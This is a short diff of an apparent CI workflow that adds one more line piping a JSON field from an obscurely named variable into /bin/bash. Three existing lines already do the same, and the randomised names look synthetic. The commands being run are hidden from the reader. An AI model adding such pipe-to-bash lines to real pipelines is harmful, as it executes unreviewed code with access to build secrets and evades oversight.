@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$rj19341" | jq -r .vrmdd4392 | /bin/bash
           printf '%s' "$do331" | jq -r .isp209 | /bin/bash
           printf '%s' "$s29473" | jq -r .tow29571 | /bin/bash
+          echo $sul75809 | jq -r .u61 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
